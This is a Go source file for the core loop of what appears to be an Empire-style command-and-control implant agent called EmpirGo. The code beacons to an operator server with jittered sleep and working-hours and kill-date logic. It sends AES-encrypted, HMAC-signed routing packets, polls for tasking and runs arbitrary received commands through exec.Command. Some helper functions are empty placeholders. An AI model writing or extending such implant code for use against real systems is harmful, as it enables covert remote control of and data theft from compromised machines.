package agent

import (
	"EmpirGo/common"
	"EmpirGo/comms"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

type MessageSender interface {
	Send(kind comms.RequestKind, routingPacket []byte) ([]byte, error)
}

type Task struct {
	Command string
	Args    []string
	Result  chan string
	Status  chan string
	// TODO: Main loop would send a "quit" signal here to kill a running task.
	Quit chan bool
}

type MainAgent struct {
	PacketHandler    comms.PacketHandler
	MessageSender    MessageSender
	profile          string
	server           string
	sessionID        string
	killDate         string
	workingHours     string
	delay            int
	jitter           float64
	lostLimit        int
	missedCheckins   int
	jobMessageBuffer string
	socksThread      bool
	socksQueue       chan bool
	tasks            map[string]*Task
	userAgent        string
	headers          map[string]string
	encryptionKey    []byte
	runningJobs      map[int]*exec.Cmd
	runningJobsMu    sync.Mutex
}

func NewMainAgent(packetHandler comms.PacketHandler, messagesender *comms.HttpMessageSender, sessionID, killDate, workingHours string, delay int, jitter float64, lostLimit int, aeskey []byte) *MainAgent {
	packetHandler.SessionID = sessionID

	return &MainAgent{
		PacketHandler: packetHandler,
		MessageSender: messagesender,
		sessionID:     sessionID,
		killDate:      killDate,
		workingHours:  workingHours,
		delay:         delay,
		jitter:        jitter,
		lostLimit:     lostLimit,
		tasks:         make(map[string]*Task),
		encryptionKey: aeskey,
		runningJobs:   make(map[int]*exec.Cmd),
	}
}

func (ma *MainAgent) AgentExit() {
	if len(ma.tasks) > 0 {
		for _, task := range ma.tasks {
			task.Status <- "kill"
		}
	}
	os.Exit(0)
}

func (ma *MainAgent) SendJobMessageBuffer() {
	result := ma.GetJobMessageBuffer()
	ProcessJobTasking(result)
}

func (ma *MainAgent) preparepacket(packets []byte) ([]byte, error) {
	if packets != nil {
		encData := common.AesEncryptThenHMAC(ma.PacketHandler.Aeskey, packets)
		routingPacket := ma.PacketHandler.BuildRoutingPacket(ma.PacketHandler.StagingKey, ma.sessionID, 5, 0, encData)
		data, err := ma.MessageSender.Send(comms.RequestData, routingPacket)
		return data, err
	} else {
		routingPacket := ma.PacketHandler.BuildRoutingPacket(ma.PacketHandler.StagingKey, ma.sessionID, 4, 0, nil)
		data, err := ma.MessageSender.Send(comms.RequestTasking, routingPacket)
		return data, err
	}
}

func (ma *MainAgent) RunCommand(command string, cmdargs ...string) string {
	cmd := exec.Command(command, cmdargs...)
	output, _ := cmd.CombinedOutput()
	return string(output)
}

// Placeholder functions to avoid compilation errors
func (ma *MainAgent) GetJobMessageBuffer() string {
	return ""
}

func ProcessJobTasking(result string) {}

func (ma *MainAgent) Run() {
	for {
		if ma.workingHours != "" {
			startEnd := strings.Split(ma.workingHours, "-")
			if len(startEnd) == 2 {
				now := time.Now()
				start, err1 := time.Parse("15:04", startEnd[0])
				end, err2 := time.Parse("15:04", startEnd[1])
				if err1 == nil && err2 == nil {
					if now.Before(start) || now.After(end) {
						sleepDuration := start.Sub(now)
						if now.After(end) {
							sleepDuration = time.Until(start.Add(24 * time.Hour))
						}
						time.Sleep(sleepDuration)
					}
				}
			}
		}

		if ma.killDate != "" {
			now := time.Now().Format("01/02/2006")
			if now >= ma.killDate {
				ma.AgentExit()
			}
		}

		ma.SendJobMessageBuffer()

		minSleep := int((1.0 - ma.jitter) * float64(ma.delay))
		maxSleep := int((1.0 + ma.jitter) * float64(ma.delay))
		sleepTime := common.RandomInt(minSleep, maxSleep)
		time.Sleep(time.Duration(sleepTime) * time.Second)

		data, err := ma.preparepacket(nil)
		result := comms.ClassifyPoll(data, err)
		processedOK := false
		if result == comms.PollTasking {
			packet, derr := ma.PacketHandler.DecodeRoutingPacket(data, ma.PacketHandler.StagingKey, ma.sessionID)
			// (nil, nil) here is a packet addressed to another session; it
			// counts as a miss, like one that does not decode or decrypt.
			if derr == nil && len(packet) > 0 {
				processedOK = ma.processTasking(packet)
			}
		}
		if !comms.PollStep(result, processedOK, ma.lostLimit, &ma.missedCheckins) {
			ma.AgentExit()
		}
	}
}
